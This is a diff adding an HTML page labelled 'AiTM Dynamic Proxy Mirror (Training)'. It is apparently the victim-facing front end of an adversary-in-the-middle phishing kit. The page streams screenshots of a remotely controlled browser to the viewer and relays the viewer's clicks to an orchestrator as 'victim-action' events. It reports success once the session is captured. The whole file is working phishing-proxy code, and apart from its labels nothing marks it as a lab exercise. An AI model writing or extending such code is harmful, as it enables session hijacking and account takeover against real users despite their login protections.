@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Research Portal</title>
+    <style>
+        body { background: #121212; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; }
+        #screen-mirror { border: 2px solid #333; width: 1280px; height: 720px; background: #000; cursor: crosshair; }
+        .status { margin-top: 10px; color: #0f0; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h2>AiTM Dynamic Proxy Mirror (Training)</h2>
+    <img id="screen-mirror" src="" />
+    <div id="status-msg" class="status">Waiting for orchestrator...</div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const img = document.getElementById('screen-mirror');
+        
+        socket.on('browser-render', (data) => {
+            img.src = 'data:image/png;base64,' + data.screenshot;
+            document.getElementById('status-msg').innerText = "Session Live: Mirroring real-time interaction";
+        });
+
+        img.addEventListener('click', (e) => {
+            const rect = img.getBoundingClientRect();
+            const x = e.clientX - rect.left;
+            const y = e.clientY - rect.top;
+            socket.emit('victim-action', { type: 'click', x, y });
+        });
+
+        socket.on('success', (data) => {
+            alert('RESEARCH SUCCESS: ' + data.message);
+        });
+    </script>
+</body>
+</html>
